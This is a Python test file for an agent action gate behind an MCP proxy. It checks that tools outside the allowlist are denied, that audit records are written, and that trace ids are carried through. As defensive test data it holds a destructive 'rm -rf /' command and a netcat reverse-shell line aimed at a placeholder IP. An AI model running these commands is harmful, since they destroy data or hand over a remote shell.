"""End-to-end tests: a real ActionGate behind the real MCP proxy.

The proxy's own tests use a fake adapter, which proves the proxy consults *something*.
These prove the something is the gate, that a denial never reaches the upstream
server, and that the record the gate wrote carries the trace id the proxy minted.
"""

import asyncio

import pytest

from custos.action_gate import ActionGate
from custos.mcp_gate_adapter import CustosGateAdapter, build_proxy
from custos.tenant import TenantManager


@pytest.fixture()
def gate():
    tm = TenantManager()
    g = ActionGate(tm)
    g.register_tools("default", {"file_read", "web_search"})
    return g


def run(coro):
    return asyncio.run(coro)


class Upstream:
    """Stands in for the MCP server the agent is trying to reach."""

    def __init__(self):
        self.calls = []

    async def __call__(self, tool, arguments):
        self.calls.append((tool, arguments))
        return {"ok": True, "tool": tool}


def test_allowlisted_tool_is_forwarded_and_recorded(gate):
    upstream = Upstream()
    proxy = build_proxy(gate, tenant_id="default")

    outcome = run(proxy.call_tool("file_read", {"path": "/tmp/a.txt"}, upstream))

    assert outcome.forwarded is True
    assert upstream.calls == [("file_read", {"path": "/tmp/a.txt"})]
    assert outcome.record_hash, "the gate must return the hash of the record it wrote"


def test_unallowlisted_tool_never_reaches_the_upstream_server(gate):
    upstream = Upstream()
    proxy = build_proxy(gate, tenant_id="default")

    outcome = run(proxy.call_tool("file_delete", {"path": "/tmp/a.txt"}, upstream))

    assert outcome.forwarded is False
    assert upstream.calls == []
    assert outcome.rule == "action_gate_tool_not_allowlisted"
    assert outcome.record_hash, "a denial is still a decision and still gets a record"


def test_unknown_tenant_is_denied_end_to_end(gate):
    upstream = Upstream()
    proxy = build_proxy(gate, tenant_id="not-provisioned")

    outcome = run(proxy.call_tool("file_read", {}, upstream))

    assert outcome.forwarded is False
    assert upstream.calls == []
    assert outcome.rule == "action_gate_unknown_tenant"


def test_the_minted_trace_id_lands_in_the_decision_record(gate):
    proxy = build_proxy(gate, tenant_id="default")
    proxy._trace_id_factory = lambda: "trace-e2e-0001"  # noqa: SLF001 - deliberate pin

    outcome = run(proxy.call_tool("file_read", {"path": "/tmp/a.txt"}))

    records = gate._tm.get_strict("default").audit_chain._records  # noqa: SLF001
    assert records, "the gate must have written a record"
    assert records[-1].trace_id == "trace-e2e-0001"
    assert records[-1].record_hash == outcome.record_hash
    assert records[-1].policy_digest, "citation is computed on the enforcement path"


def test_a_denied_call_records_the_rule_it_fired(gate):
    proxy = build_proxy(gate, tenant_id="default")

    run(proxy.call_tool("shell_exec", {"cmd": "rm -rf /"}))

    records = gate._tm.get_strict("default").audit_chain._records  # noqa: SLF001
    assert records[-1].triggered_rule == "action_gate_tool_not_allowlisted"


def test_a_dangerous_command_inside_an_allowed_tool_is_still_denied(gate):
    """The allowlist is not a content pass: the gate's content rules still run."""
    upstream = Upstream()
    proxy = build_proxy(gate, tenant_id="default")

    outcome = run(proxy.call_tool("web_search", {"q": "nc -e /bin/sh 10.0.0.1 4444"}, upstream))

    assert outcome.forwarded is False
    assert upstream.calls == []
    assert outcome.rule and outcome.rule.startswith("action_cmd_")


def test_two_calls_produce_two_records_with_distinct_trace_ids(gate):
    proxy = build_proxy(gate, tenant_id="default")
    run(proxy.call_tool("file_read", {"path": "/a"}))
    run(proxy.call_tool("file_read", {"path": "/b"}))

    records = gate._tm.get_strict("default").audit_chain._records  # noqa: SLF001
    assert len(records) == 2
    assert records[0].trace_id != records[1].trace_id
    assert records[0].record_hash != records[1].record_hash


def test_the_adapter_refuses_to_be_built_without_a_gate():
    with pytest.raises(ValueError):
        CustosGateAdapter(None)


def test_adapter_returns_deny_for_an_unallowlisted_tool(gate):
    adapter = CustosGateAdapter(gate)
    verdict = asyncio.run(
        adapter.evaluate(tenant_id="default", tool="nope", arguments={}, trace_id="t1")
    )
    assert verdict.allowed is False
    assert verdict.rule == "action_gate_tool_not_allowlisted"


def test_adapter_returns_allow_and_a_hash_for_an_allowed_tool(gate):
    adapter = CustosGateAdapter(gate)
    verdict = asyncio.run(
        adapter.evaluate(tenant_id="default", tool="file_read", arguments={"path": "/x"}, trace_id="t2")
    )
    assert verdict.allowed is True
    assert verdict.record_hash
